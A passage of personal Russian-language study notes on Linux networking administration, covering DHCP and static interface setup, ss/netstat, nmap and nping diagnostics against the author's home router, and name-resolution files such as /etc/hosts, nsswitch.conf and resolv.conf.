Затем запускем dhclient и запрашиваем второй ip-адрес 192.168.100.4  для enp0s3 (см ниже, отразается в ip a, НЕ!отражается в ifconfig)
sudo dhclient enp0s3 -4 -v
Internet Systems Consortium DHCP Client 4.4.1
For info, please visit https://www.isc.org/software/dhcp/

Listening on LPF/enp0s3/08:00:27:30:1c:fd
Sending on   LPF/enp0s3/08:00:27:30:1c:fd
Sending on   Socket/fallback
DHCPREQUEST for 192.168.100.4 on enp0s3 to 255.255.255.255 port 67 (xid=0x69193c71)
DHCPACK of 192.168.100.4 from 192.168.100.1 (xid=0x713c1969)
RTNETLINK answers: File exists
bound to 192.168.100.4 -- renewal in 36672 seconds.

ip a
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:30:1c:fd brd ff:ff:ff:ff:ff:ff
    inet 192.168.100.55/24 brd 192.168.100.255 scope global enp0s3
       valid_lft forever preferred_lft forever
    inet 192.168.100.4/24 brd 192.168.100.255 scope global secondary dynamic enp0s3
       valid_lft 86333sec preferred_lft 86333sec
    inet6 fe80::3b08:1704:f037:e972/64 scope link noprefixroute
       valid_lft forever preferred_lft forever



sudo ifconfig lo 127.100.150.50/8  // изменить ip адр для lo интерефйса

    = = = = =  статическая настройка интерфейсов = = = = =
https://help.ubuntu.ru/wiki/%D0%BD%D0%B0%D1%81%D1%82%D1%80%D0%BE%D0%B9%D0%BA%D0%B0_%D1%81%D0%B5%D1%82%D0%B8_%D0%B2%D1%80%D1%83%D1%87%D0%BD%D1%83%D1%8E
Настройка проводной сети Настройка IP-адреса, шлюза по умолчанию, маски подсети
Отредактируйте файл конфигурации /etc/network/interfaces Сохранение параметров интерфейсов
$ sudo nano /etc/network/interfaces 
И допишите в него:
#Для статического IP:
iface enp0s3 inet static 
address 192.168.0.1 
netmask 255.255.255.0 
gateway 192.168.0.254
dns-nameservers 192.168.0.254 8.8.8.8 //! Я:НЕ РАБОТАЕТ В MINT! должно быть указано в /etc/resolv.conf
auto enp0s3
#Для динамического IP:  // Я:НЕ обязательно для DHCP указывать, делает автом-ки NetworkManager через "dhclint"!
iface eth1 inet dhcp
auto eth1 
Где:
iface enp0s3 inet static - указывает, что интерфейс (iface eth0) находится в диапазоне адресов IPv4 (inet) со статическим ip (static);
address 192.168.0.1 - указывает что IP адрес (address) нашей сетевой карты 192.168.0.1;
netmask 255.255.255.0 - указывает что наша маска подсети (netmask) имеет значение 255.255.255.0;
gateway 192.168.0.254 - адрес шлюза (gateway) по умолчанию 192.168.0.254;
auto enp0s3 - указывет системе что интерфейс enp0s3 необходимо включать автоматически при загрузке системы с вышеуказанными параметрами.
Более подробно про синтаксис файла /etc/network/interfaces можно прочитать в документации.
$ ip addr// В итоге файл /etc/network/interfaces должен выглядеть примерно так: (для одного проводного соединения со статическим IP)

ifconfig eth0 192.168.0.101 netmask 255.255.255.0
route add default gw 192.168.0.254 # настройка шлюза gateway
ip route add default via 192.168.0.254 dev eth0


Chat GPT Настройки Ethernet интерфейса в Linux Debian 
Для настройки Ethernet интерфейса в Linux Debian необходимо выполнить следующие шаги:
1. Открыть терминал и ввести команду sudo nano /etc/network/interfaces для открытия файла конфигурации сетевых интерфейсов.
2. Добавить следующие строки в файл, заменив eth0 на имя вашего Ethernet интерфейса:
auto eth0
iface eth0 inet dhcp
3. Сохранить изменения, нажав Ctrl+O, а затем выйти из редактора, нажав Ctrl+X.
4. Для применения изменений выполните команду sudo ifdown eth0 && sudo ifup eth0.
После выполнения этих шагов Ethernet интерфейс будет настроен на использование DHCP для получения IP-адреса. Если вы хотите настроить статический IP-адрес, замените строку iface eth0 inet dhcp на следующую конфигурацию:
auto eth0
iface eth0 inet static
address 192.168.1.100
netmask 255.255.255.0
gateway 192.168.1.1
Замените значения адреса, маски подсети и шлюза на соответствующие значения в вашей сети. После сохранения изменений выполните команду sudo ifdown eth0 && sudo ifup eth0 для применения настроек.

2
oem@LnxPC:~$ ip a
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:30:1c:fd brd ff:ff:ff:ff:ff:ff
    inet6 fe80::a00:27ff:fe30:1cfd/64 scope link 
       valid_lft forever preferred_lft forever

oem@LnxPC:~$ systemctl start networking.service 
oem@LnxPC:~$ ip a

2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:30:1c:fd brd ff:ff:ff:ff:ff:ff
    inet 192.168.100.100/24 brd 192.168.100.255 scope global enp0s3
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fe30:1cfd/64 scope link 
       valid_lft forever preferred_lft forever
oem@LnxPC:~$ ping 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=56 time=30.9 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=56 time=29.9 ms
oem@LnxPC:~$ sudo dhclient enp0s3 
oem@LnxPC:~$ ip a
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:30:1c:fd brd ff:ff:ff:ff:ff:ff
    inet 192.168.100.100/24 brd 192.168.100.255 scope global enp0s3
       valid_lft forever preferred_lft forever
    inet 192.168.100.8/24 brd 192.168.100.255 scope global secondary dynamic enp0s3
       valid_lft 86379sec preferred_lft 86379sec
    inet6 fe80::a00:27ff:fe30:1cfd/64 scope link 
       valid_lft forever preferred_lft forever

oem@LnxPC:~$ ping 8.8.8.8 -I 192.168.100.8  // -I ping c определенного интерфейса
PING 8.8.8.8 (8.8.8.8) from 192.168.100.8 : 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=56 time=31.0 ms
oem@LnxPC:~$ ping 8.8.8.8 -I 192.168.100.100
PING 8.8.8.8 (8.8.8.8) from 192.168.100.100 : 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=56 time=30.9 ms

// Далее последовательность действий по присвоению/отзыву инт статич IP из /etc/network/interface или по DHCP через "dhclient/ dhclient -r"
oem@LnxPC:~$ ip a
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:30:1c:fd brd ff:ff:ff:ff:ff:ff
    inet 192.168.100.100/24 brd 192.168.100.255 scope global enp0s3 / ранее присвоен СТАТИЧЕСКИ  из /etc/network/interface
       valid_lft forever preferred_lft forever
    inet 192.168.100.8/24 brd 192.168.100.255 scope global secondary dynamic enp0s3  // ранее присвоен динамитчески командой dhclient
       valid_lft 86256sec preferred_lft 86256sec
    inet6 fe80::a00:27ff:fe30:1cfd/64 scope link 
       valid_lft forever preferred_lft forever
oem@LnxPC:~$ sudo dhclient enp0s3 -r // отозвать ранее присвоенные по DHCP адреса, а также статические адреса!!
Killed old client process
oem@LnxPC:~$ ip a
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:30:1c:fd brd ff:ff:ff:ff:ff:ff
    inet6 fe80::a00:27ff:fe30:1cfd/64 scope link 
       valid_lft forever preferred_lft forever

oem@LnxPC:~$ systemctl restart networking.service // перезапустить службу сети и получить  СТАТИЧЕСКИЙ адрес из /etc/network/interface
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:30:1c:fd brd ff:ff:ff:ff:ff:ff
    inet 192.168.100.100/24 brd 192.168.100.255 scope global enp0s3
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fe30:1cfd/64 scope link tentative 
       valid_lft forever preferred_lft forever
!!в других версиях linux вместо "systemctl restart networking.service" следует использовать  "service network stop/start/restart"

			  = = = = = ss, netstat = = = = = = =
ss -lntup //отображ какие приложения с их pid, которые занимаются прослушиванием соединений TCP или UDP
 ss - Аналог netstat - программа отражения состояния TCP/UNIX/UDP сокетов sockets
-l — выводит на экран все прослушивающиеся сокеты;
-n — вместо названий служб показывает номера портов;
-t — указывает, что нужно показать все  TCP sockets/TCP-соединения сетевой подсистемы;
-u — указывает, что нужно показать все  UDP sockets/ UDP-соединения сетевой подсистемы
-p - список значений pid процессов, которые открыли порты.
-x - display only Unix domain sockets
остальное см в ss --help 


netstat - без ключей  - список всех открытых сокетов файловых UNIX и tcp/ip
netstat -tulpan // список открытых портов с помощью
-l — выводит все прослушивающиеся сокеты (сочетания IP-адреса и номера порта) = СЕРВЕРЫ СЛУЖБ!;
-t — указывает, что нужно показать все TCP-соединения сетевой подсистемы;
-u — указывает, что нужно показать UDP-соединения сетевой подсистемы;
-p - вывод PID/Program name программы прослушив-щей порт /установ соединение через порт
-a — показывает только активные соединения;
-n — вместо названий служб показывает номера портов (не произодит DNS резолвинг).
netstat -tulpan | grep ssh    список открытых портов для ssh
Proto Recv-Q Send-Q  Local Address     Foreign Address     State        PID/Program name
tcp     0          0           0.0.0.0:22              0.0.0.0:*         LISTEN      753/sshd: /usr/sbin                              // означает  0..0 всем узлах (cлюбых IP,*-с любыхпортов)доступна служба
tcp     0         60     192.168.100.9:22      192.168.100.13:49750    ESTABLISHED 1535/sshd: oem 
// означает        ^ служба установила соедн
tcp6    0         0               :::22                   :::*           LISTEN      753/sshd: /usr/sbin
netstat -lntup | grep ":80"  список открытых портов для www 
 
netstat -i
Таблица интерфейсов ядра
Iface      MTU    RX-OK RX-ERR RX-DRP RX-OVR    TX-OK TX-ERR TX-DRP TX-OVR Flg
enp0s3    1500      257      0      0 0           338      0      0      0 BMRU
lo       65536       98      0      0 0            98      0      0      0 LRU

netstat -ie // (=  ifconfig) РАСШИРЕННАЯ статис-ка по интерфейсам, сетевые интерфейсы в системе 
eth0 Link encap:Ethernet HWaddr 00:1d:09:9b:99:67
 inet addr:192.168.1.2 Bcast:192.168.1.255 Mask:255.255.255.0
 inet6 addr: fe80::21d:9ff:fe9b:9967/64 Scope:Link
 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1
 RX packets:238488 errors:0 dropped:0 overruns:0 frame

netstat -rn //="netstat -rnF" - таблицa IP-маршрутизации ядра = FIB таблица (Кетов видео FW1)
Таблица маршутизации ядра протокола IP
Destination Gateway Genmask Flags MSS Window irtt Iface
0.0.0.0         192.168.100.1   0.0.0.0         UG        0 0          0 enp0s3
169.254.0.0     0.0.0.0         255.255.0.0     U         0 0          0 enp0s3
192.168.100.0   0.0.0.0         255.255.255.0   U         0 0          0 enp0s3
netstat -rnC // таблицa IP-маршрутизации ядра ИЗ КЭША = CIB таблица (Кетов видео FW1)

sudo netstat -tup
Активные соединения с интернетом (w/o servers)
Proto Recv-Q Send-Q Local Address Foreign Address State       PID/Program name
tcp        0      0 lnxpc:54136             amyrose.canonical.:http TIME_WAIT   -         
tcp        0      0 lnxpc:ssh               vichonor:49893          ESTABLISHED 2637/sshd: oem [pri
udp        0      0 lnxpc:bootpc            modemONT:bootps         ESTABLISHED 795/NetworkManager

route // аналог netstat -r = таблицa IP-маршрутизации ядра.
netstat -n // таблицa всех подключений по портам
// Локальные файловые  сокеты UNIX - имена в каталоге /dev/ххх и др
 sudo netstat -l -n -p // отобразить сокеты tcpip и сокеты UNIX для служб серверов (-l ) на PC в             
  Активные сокеты домена UNIX (only servers)
  Proto RefCnt Flags       Type       State         I-Node   PID/Program name     Путь
  unix  2      [ ACC ]     STREAM     LISTENING     20378    786/Xorg             @/tmp/.X11-unix/X0
    
  !! sudo обязательно, иначе не отобразиться PID/Program name !!
sudo netstat -a -n -p // отобразить сокеты tcpip и сокеты unix для служб серверов ищущих соединение (признак "LISTEN") и установл соединения ("ESTABLISHED ") в числовом формате №№адресов и портов (-n) и с PID службы (-p) 
  Активные соединения с интернетом (servers and established)
  Proto Recv-Q Send-Q Local Address     Foreign Address               State       PID/Program name
  tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      758/sshd: /usr/sbin
                         ^ sshd сервер VM, слушает, соединение не установлено!  'LISTEN' - признак PC server
                         также признак, что PC=server, Local Address исп-ет !общеизвестный! порт (нприм, 22,80,21 порт)
  udp        0      0 192.168.100.4:68        192.168.100.1:67        ESTABLISHED 605/NetworkManager
                     ^ bootpc клиент  VM           ^ сокет bootps сервера на modeme ONT
// bootpc  68 порт - клиeнт \,  bootps  67 порт - сервера DHCP
// про  NetworkManager - читай ниже, этот демон, в частности используетя dhclient!
// кетов видео Трассировка системных и библиотечных вызовов Linux.mp4 bootps - протокол выдачи ip без 

sudo netstat -tunp
Активные соединения с интернетом (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address            State      PID/Program name
tcp        0      0 192.168.100.4:37836     82.209.230.71:21        ESTABLISHED 3439/ftp  
tcp        0      0 192.168.100.4:22        192.168.100.13:64163    ESTABLISHED 2724/sshd
tcp        0      0 192.168.100.4:51342     34.117.65.55:443        ESTABLISHED 3082/firefox 
tcp        0      0 192.168.100.4:45488     34.107.221.82:80        ESTABLISHED 3082/firefox 
//установлено соeд-ние от Honor с VM по ssh(22), VM по ftp с ftp.mgts.by (21), браузером VM  с wiki.org (80,443)

sudo netstat -t/-u -n -p // отбразить выше но только для tcp/udp сокетов
sudo netstat  -a  -p //отбразить сокеты tcpip и сокеты unix для служб серверов и служб клинтов на PC
                     // без числового формата №№адресов и портов (-n)   
  Активные соединения с интернетом (servers and established)
  Proto Recv-Q Send-Q Local Address Foreign Address State       PID/Program name
  tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      758/sshd: /usr/sbin
									^ сокет сервера на PC
  udp        0      0 lnxpc:bootpc            192.168.100.1:bootps    ESTABLISHED 605/NetworkManager
                              ^ dhcp клиент (bootpc)                     ^ сокет клиента  на PC

 = = = = nmap  // сканирование портов удал узла ОЧЕНЬ широкие возможности ИЗУЧИТЬ = = = 
nmap 192.168.100.1 
см кетов ldap kerberos 1 часть
Starting Nmap 7.80 ( https://nmap.org ) at 2023-06-05 23:22 +03
Nmap scan report for 192.168.100.1 (192.168.100.1)
Host is up (0.024s latency).
Not shown: 996 closed ports
PORT    STATE    SERVICE
23/tcp  filtered telnet
53/tcp  open     domain
80/tcp  open     http
443/tcp open     https
nmap 8.8.8.8
Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-27 00:39 +03
Nmap scan report for dns.google (8.8.8.8)
Host is up (0.015s latency).
Not shown: 998 filtered ports
PORT    STATE SERVICE
53/tcp  open  domain
443/tcp open  https

nmap -A -T4 192.168.100.1 //  -A, для определения версии ОС, -T4 для более быстрого выполнения;
Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-27 23:21 +03
Nmap scan report for modemONT (192.168.100.1)
Host is up (0.019s latency).
Not shown: 996 closed ports
PORT    STATE    SERVICE   VERSION
23/tcp  filtered telnet
53/tcp  open     domain    ISC BIND
80/tcp  open     http      Mini web server 1.0 (ZTE ZXV10 W300 ADSL router http config)
|_http-server-header: Mini web server 1.0 ZTE corp 2005.
|_http-title: MT-PON-AT-4
443/tcp open     ssl/https Mini web server 1.0 ZTE corp 2005.
|_http-server-header: Mini web server 1.0 ZTE corp 2005.
|_http-title: 400 Bad Request
|_ssl-date: 2023-07-27T20:22:27+00:00; 0s from scanner time.
Service Info: OS: Linux 2.4.17; Device: broadband router; CPE: cpe:/h:zte:zxv10_w300, cpe:/o:montavista:linux_kernel:2.4.17

sudo nmap --traceroute 8.8.8.8 // режим traceroute !! ЛУЧШЕ !! стандартной программы  tracepath (см ниже)
Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-28 00:01 +03
Nmap scan report for dns.google (8.8.8.8)
Host is up (0.013s latency).
Not shown: 998 filtered ports
PORT    STATE SERVICE
53/tcp  open  domain
443/tcp open  https

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   5.01 ms  modemONT (192.168.100.1)
2   8.65 ms  100.126.128.1
3   7.01 ms  mm-57-80-84-93.dynamic.pppoe.mgts.by (93.84.80.57)
4   7.02 ms  172.23.2.57 (172.23.2.57)
5   11.98 ms core1.net.belpak.by (93.85.80.45)
6   9.94 ms  ie1.net.belpak.by (93.85.80.38)
7   7.05 ms  asbr9.net.belpak.by (93.85.80.238)
8   35.49 ms 74.125.146.96
9   15.95 ms 142.250.37.209
10  13.19 ms 108.170.234.247
11  14.16 ms dns.google (8.8.8.8)
Nmap done: 1 IP address (1 host up) scanned in 5.65 seconds

tracepath 8.8.8.8
 1?: [LOCALHOST]                      pmtu 1500
 1:  modemONT                                              2.409ms
 1:  modemONT                                              2.311ms
 2:  modemONT                                              2.195ms pmtu 1492
 2:  100.126.128.1                                         6.458ms
 3:  mm-57-80-84-93.dynamic.pppoe.mgts.by                  5.002ms
 4:  172.23.2.57                                           6.999ms
 5:  core1.net.belpak.by                                  10.745ms
 6:  ie1.net.belpak.by                                     6.836ms
 7:  asbr9.net.belpak.by                                   4.580ms
 8:  74.125.146.96                                        28.250ms
 9:  no reply
10:  no reply
11:  no reply

= = = nping = = =   часть пакета nman 
nping = tcp udp arp PING
https://nyukers.blogspot.com/2020/11/nping.html#gsc.tab=0

sudo nping --udp -c 2  -p 5200  speedtest.shinternet.ch //UDP mode ping
SENT (0.3790s) UDP 192.168.100.9:53 > 88.213.191.212:5200 ttl=64 id=56856 iplen=28
RCVD (0.4186s) ICMP [88.213.191.212 > 192.168.100.9 Port unreachable (type=3/code=3) ] IP [ttl=52 id=13522 iplen=56 ]
SENT (1.3796s) UDP 192.168.100.9:53 > 88.213.191.212:5200 ttl=64 id=56856 iplen=28
RCVD (1.4201s) ICMP [88.213.191.212 > 192.168.100.9 Port unreachable (type=3/code=3) ] IP [ttl=52 id=13634 iplen=56 ]
Max rtt: 40.432ms | Min rtt: 39.523ms | Avg rtt: 39.977ms
Raw packets sent: 2 (56B) | Rcvd: 2 (112B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.45 seconds

nping --tcp-connect -c 2 -p 7700 192.168.100.3 // TCP connect - ping
SENT (0.0014s) Starting TCP Handshake > 192.168.100.3:7700
RCVD (0.0069s) Handshake with 192.168.100.3:7700 completed
SENT (1.0125s) Starting TCP Handshake > 192.168.100.3:7700
RCVD (1.0167s) Handshake with 192.168.100.3:7700 completed
Max rtt: 5.586ms | Min rtt: 4.280ms | Avg rtt: 4.933ms
TCP connection attempts: 2 | Successful connections: 2 | Failed: 0 (0.00%)
Nping done: 1 IP address pinged in 1.02 seconds

sudo nping --tcp -c 2 --flags S -p 7700 192.168.100.3 // TCP mode - ping
SENT (0.0280s) TCP 192.168.100.9:19292 > 192.168.100.3:7700 S ttl=64 id=38475 iplen=40  seq=382953101 win=1480
RCVD (0.0361s) TCP 192.168.100.3:7700 > 192.168.100.9:19292 SA ttl=64 id=0 iplen=44  seq=1314697859 win=65535 <mss 1460>
SENT (1.0370s) TCP 192.168.100.9:19292 > 192.168.100.3:7700 S ttl=64 id=38475 iplen=40  seq=382953101 win=1480
RCVD (1.0420s) TCP 192.168.100.3:7700 > 192.168.100.9:19292 SA ttl=64 id=0 iplen=44  seq=1330412710 win=65535 <mss 1460>
Max rtt: 7.996ms | Min rtt: 4.977ms | Avg rtt: 6.486ms
Raw packets sent: 2 (80B) | Rcvd: 2 (92B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 1.07 seconds

sudo nping --arp 192.168.100.3 // arp - ping
Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2023-07-27 23:41 +03
SENT (0.0151s) ARP who has 192.168.100.3? Tell 192.168.100.9
RCVD (0.0193s) ARP reply 192.168.100.3 is at 90:78:B2:94:38:2F
SENT (1.0222s) ARP who has 192.168.100.3? Tell 192.168.100.9
RCVD (1.0277s) ARP reply 192.168.100.3 is at 90:78:B2:94:38:2F
SENT (2.0239s) ARP who has 192.168.100.3? Tell 192.168.100.9
RCVD (2.0288s) ARP reply 192.168.100.3 is at 90:78:B2:94:38:2F
Max rtt: N/A | Min rtt: N/A | Avg rtt: N/A
Raw packets sent: 3 (210B) | Rcvd: 3 (230B) | Lost: 0 (0.00%)
Nping done: 1 IP address pinged in 4.19 seconds


cat /etc/services // файл список портов tcp udp ddp sctp серверов демонов служб 
ftp-data        20/tcp
ftp             21/tcp
fsp             21/udp          fspd
ssh             22/tcp                          # SSH Remote Login Protocol
telnet          23/tcp
smtp            25/tcp          mail
# Datagram Delivery Protocol services
rtmp            1/ddp                   # Routing Table Maintenance Protocol
nbp             2/ddp                   # Name Binding Protocol
echo            4/ddp                   # AppleTalk Echo Protocol
zip             6/ddp                   # Zone Information Protocol


cat /etc/protocols // файл стандартных протоколов
ip      0       IP              # internet protocol, pseudo protocol number
hopopt  0       HOPOPT          # IPv6 Hop-by-Hop Option [RFC1883]
icmp    1       ICMP            # internet control message protocol
igmp    2       IGMP            # Internet Group Management
ggp     3       GGP             # gateway-gateway protocol
ipencap 4       IP-ENCAP        # IP encapsulated in IP (officially ``IP'')
st      5       ST              # ST datagram mode
tcp     6       TCP             # transmission control protocol



= =  Изменить имя хоста PC = =
cat /etc/hostname // host имя узла
LnxPC
cat /etc/hosts //  "локальная" "dns"-запись,  таблица hostname узлов в сети
127.0.0.1       localhost
127.0.1.1       LnxPC
192.168.100.1   modemONT

https://losst.pro/kak-izmenit-imya-kompyutera-ubuntu?ysclid=lpec1e38zk572482196
1)sudo hostname pc1 установить имя компьютера до перезагрузки 
 Static hostname Chassis Machine ID Boot ID Operating System Kernel Architecture Hardware Model
2) 
2.1)Чтобы сделать изменения постоянными нужно изменить содержимое двух файлов
  /etc/hostname и /etc/hosts
2.2)Использовать команду hostnamectl
 sudo hostnamectl set-hostname новое_имя
Затем откройте второй файл:  sudo vi /etc/hosts
найдите строку: 127.0.0.1 старое_имя И замените старое имя на новое, после этогО перезагрузить
компьютер ИЛИ БЕЗ перезагрузки
  systemctl restart systemd-logind.service ;journalctl -e
ноя 25 22:05:54 LnxPC dbus-daemon[635]: [system] Activating via systemd: service name='org.f>
ноя 25 22:05:54 LnxPC1 systemd-resolved[620]: System hostname changed to 'LnxPC1'.
 = END Изменить имя хоста PC =


 ===  strace  openat =====
https://ru.manpages.org/openat/2 ВОЗВРАЩАЕМОЕ ЗНАЧЕНИЕ
Вызовы open(), openat() и creat() возвращают новый дескриптор файла или "-1" в случае ошибки
  (в этом случае errno устанавливается в соответствующее значение).
 

strace -e openat ping medemONT // при каждой попытке ping идет обращение к  /etc/hosts за разрешением имени medemONT
openat(AT_FDCWD, "/etc/nsswitch.conf", O_RDONLY|O_CLOEXEC) = 5 // 5 -  дескриптор файла
openat(AT_FDCWD, "/etc/host.conf", O_RDONLY|O_CLOEXEC) = 5
openat(AT_FDCWD, "/etc/resolv.conf", O_RDONLY|O_CLOEXEC) = 5
openat(AT_FDCWD, "/etc/hosts", O_RDONLY|O_CLOEXEC) = 5
PING modemONT (192.168.100.1) 56(84) bytes of data.
openat(AT_FDCWD, "/etc/hosts", O_RDONLY|O_CLOEXEC) = 5
64 bytes from modemONT (192.168.100.1): icmp_seq=1 ttl=64 time=2.92 ms
openat(AT_FDCWD, "/etc/hosts", O_RDONLY|O_CLOEXEC) = 5
64 bytes from modemONT (192.168.100.1): icmp_seq=2 ttl=64 time=2.80 ms

cat /etc/networks //испол-ся в других linux утилитах, напр ping, также см route)
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
home-network 192.168.100.0


			 = = = = = route  = = = = = 
route add -net 8.8.8.8 netmask 255.255.255.255 metric 1024 dev enp0s3  //задать матшрут к 8.8.8.8

route //отобразить хосты в url-формате
Destination Gateway Genmask Flags Metric Ref Use Iface
default         modemONT        0.0.0.0         UG    100    0        0 enp0s3
dns.google      0.0.0.0         255.255.255.255 UH    1024   0        0 enp0s3
link-local      0.0.0.0         255.255.0.0     U     1000   0        0 enp0s3
home-network    0.0.0.0         255.255.255.0   U     100    0        0 enp0s3

route -n //отобразить хосты в числовом формате
Таблица маршутизации ядра протокола IP
Destination Gateway Genmask Flags Metric Ref Use Iface
0.0.0.0         192.168.100.1   0.0.0.0         UG    100    0        0 enp0s3
8.8.8.8         0.0.0.0         255.255.255.255 UH    1024   0        0 enp0s3
169.254.0.0     0.0.0.0         255.255.0.0     U     1000   0        0 enp0s3
192.168.100.0   0.0.0.0         255.255.255.0   U     100    0        0 enp0s3

			 = = = = = nsswitch.conf   resolv.conf = = = = = 
ketov видео  "Сетевые интерфейсы и статическая маршрутизация" 55мин
Ketov Кетов Сетевые интерфейсы и статическая маршрутизация.mp4 nsswitch 42 стр  последл запросы к модулям!
/lib/x86_64-linux-gnu/libresolv.so.2 - специальная библиотека для выполнения разрешения адресов через DNS!
/etc/nsswitch.conf  - коммутатор службы имен (набор библиотек ядра), который определеяет порядок поиска имен узлов и сетей через 
  локальные файлы hosts, networks или DNS или LDAP и т.д.!!!

https://help.ubuntu.ru/wiki/%D0%BD%D0%B0%D1%81%D1%82%D1%80%D0%BE%D0%B9%D0%BA%D0%B0_%D1%81%D0%B5%D1%82%D0%B8_%D0%B2_linux
/etc/nsswitch.conf Name Service Switch configuration file -  Файл определяет порядок поиска имени хоста/сети, за данную настройку отвечают строки:
Для хостов:
 hosts ("локальный" "dns"):files dns // т.е сначала просматриваются локальный файл (/etc/hosts), затем запрос к dns
Для сетей:
 networks:  files
Параметр files указывает использовать указанные файлы (/etc/hosts и /etc/networks соответственно), параметр dns указывает использовать службу dns.

/etc/resolv.conf //файл определяет параметры механизма преобразования сетевых имен в IP адреса. Пример:
читай man resolv.conf!

структура /etc/resolv.conf  
        nameserver 8.8.4.4 // добавлен мной, будет использоваться по-умолчанию пока не перезапустится служба 
         // systemctl restart systemd-resolved.service.Но приэтом ком-да "resolvectl status" будет все равно отображать
        // 192.168.100.1 как сервер по-умолчанию
        // nameserver 8.8.4.4 будет использоваться постоянно по-умолчанию при СТАТИЧЕСКОМ конфигурировании интерфейса 
        nameserver 127.0.0.53 // добавляется linux по-умолчанию !каждый раз! при запуске systemd-resolved.service,
           // представляет собой редиректор на dns cache сервер - !!демон кэширования имен systemd-resolved!! cm  netstat -tulpn
        options edns0 trust-ad
        search .  // поисковый домен dns по умолчанию "." - полное имя, вводимое пользователем будт разрешаться по A запросу
       #search by. //если так,то при "ping mts" dnsclient запросит по A запросу "mts.by", 
                  ".by" подставиться из search

cat /etc/resolv.conf // resolver configuration file файл конфигурации  службы имен - DNS серверов
nameserver 10.0.0.4 // будут использоваться OC при !статическом! задании интерфейса и!отключении \ ("dhclient -r")
nameserver 8.8.8.8 // будут использоваться OC при !статическом! задании интерфейса и!отключении dhcp ("dhclient -r")
search domain.local //Первые 2 строчки указывают сервера DNS. Третья строка указывает домены поиска. Если при разрешении имени, имя не будет FQDN-именем, то данный домен подставиться в виде «окончания». Например при выполнении команды ping host, прингуемый адрес преобразуется в host.domain.local. Остальные параметры можно почитать в man resolv.conf.

 // Если на /etc/resolve.conf  первым поставить "nameserver 8.8.8.8", а не "nameserver 127.0.0.53"
 //то через dump видно, что запросы идту от 192.168.100.8 к 8.8.8.8


cat /etc/ethertypes //файл базы типов EtherType 
# The EtherType is a two-octet field of Ethernet frames used to indicate which protocol is contained in their payload.
# <name>        <hexnumber> <alias1>...<alias35> # Comment
IPv4            0800    ip ip4  # IP (IPv4)
X25             0805
ARP             0806    ether-arp # Address Resolution Protocol

cat /etc/rpc //файл базы номеров RPC
# This file contains user readable names that can be used in place of rpc program numbers.
portmapper      100000  portmap sunrpc
rstatd          100001  rstat rstat_svc rup perfmeter
rusersd         100002  rusers
nfs             100003  nfsprog

https://help.ubuntu.ru/wiki/%D0%BD%D0%B0%D1%81%D1%82%D1%80%D0%BE%D0%B9%D0%BA%D0%B0_%D1%81%D0%B5%D1%82%D0%B8_%D0%B2%D1%80%D1%83%D1%87%D0%BD%D1%83%D1%8E
sudo lshw -C network // посмотреть подключенные сетевые устройства.
ubuntu@ubuntu:~$ sudo lshw -C network
  *-network               
       description: Ethernet interface                             # Тип устройства 
       product: L2 100 Mbit Ethernet Adapter                       # Название адаптера
       vendor: Attansic Technology Corp.                           # Производитель устройства
       physical id: 0
       bus info: pci@0000:03:00.0
       logical name: eth0                                          # Имя сетевого интерфейса
       version: a0
       serial: 00:00:00:00:00:00                                   # Физический адрес устройства (mac-адрес)
       size: 100MB/s
       capacity: 100MB/s
       width: 64 bits
       clock: 33MHz
       capabilities: pm msi pciexpress vpd bus_master cap_list 
ethernet physical tp 10bt 10bt-fd 100bt 100bt-fd autonegotiation
       configuration: autonegotiation=on broadcast=yes 
                      driver=atl2                                  # Используемый драйвер
                      driverversion=2.2.3                          # Версия драйвера
                      duplex=full firmware=L2 ip=192.168.0.5 latency=0 
                      link=yes                                     # Наличие линка
                      module=atl2 multicast=yes port=twisted pair 
                      speed=100MB/s                                # Текущая скорость подключения.
Обратите внимание на строку:

       logical name: eth0 
eth0 - это и есть искомое имя сетевого интерфейса.

Имя eth0 будет далее применяться для настройки именно данной сетевой карты. Где eth обозначает что используется Ethernet интерфейс, а 0 - номер устройства. Если у вас установлено несколько сетевых устройств, то, соответственно, им будут присвоены имена: eth0, eth1, eth2 и т.д.

После внедрения SystemD (начиная с Ubuntu 15.04) сетевые интерфейсы могут иметь другие имена (не ethX). Сделано это для того, что бы имена сетевых устройств не менялись при подключении к машине новых адаптеров (в последнее время, некоторые USB модемы выступают в роли сетевого адаптера). В результате eth0 может называться например enp0s4 или eno1, или даже enx78e7d1ea46da. Именно это имя сетевого адаптера и нужно использовать в настройке сети.
Более подробно о наименовании сетевых интерфейсов в SystemD можно почитать тут (англ.).
